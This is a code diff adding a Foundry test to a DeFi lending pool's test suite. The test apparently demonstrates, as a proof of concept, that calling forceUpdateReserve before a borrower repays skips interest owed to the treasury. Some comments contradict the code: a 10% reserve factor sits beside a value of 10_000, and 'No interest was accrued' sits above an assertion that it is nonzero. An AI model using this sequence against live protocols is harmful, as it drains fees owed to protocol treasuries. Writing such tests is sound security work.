@@ -152,4 +152,33 @@ contract PoolBorrowTests is PoolSetup {
   //   assertEq(loanToken.balanceOf(RECEIVER), amountBorrowed, 'borrower balance');
   //   assertEq(loanToken.balanceOf(address(morpho)), amountSupplied - amountBorrowed, 'morpho balance');
   // }
+
+  function test_bypassInterestAccrual() external {
+    _mintAndApprove(alice, tokenA, 4000 ether, address(pool));
+
+    // Set the reserve factor to 1000 bp (10%)
+    poolFactory.setReserveFactor(10_000);
+
+    // Alice supplies and borrows tokenA from the pool
+    vm.startPrank(alice);
+    pool.supplySimple(address(tokenA), alice, 2000 ether, 0);
+    pool.borrowSimple(address(tokenA), alice, 800 ether, 0);
+
+    vm.warp(block.timestamp + 10 days);
+
+    assertGt(pool.getDebt(address(tokenA), alice, 0), 0);
+    vm.stopPrank();
+
+    //Anyone can front-run repayment skipping the interest accrual to the treasury
+    pool.forceUpdateReserve(address(tokenA));
+
+    vm.startPrank(alice);
+    tokenA.approve(address(pool), UINT256_MAX);
+    pool.repaySimple(address(tokenA), UINT256_MAX, 0);
+    vm.stopPrank();
+
+    //No interest was accrued to the treasury
+    DataTypes.ReserveData memory data = pool.getReserveData(address(tokenA));
+    assertNotEq(data.accruedToTreasuryShares, 0);
+  }
 }
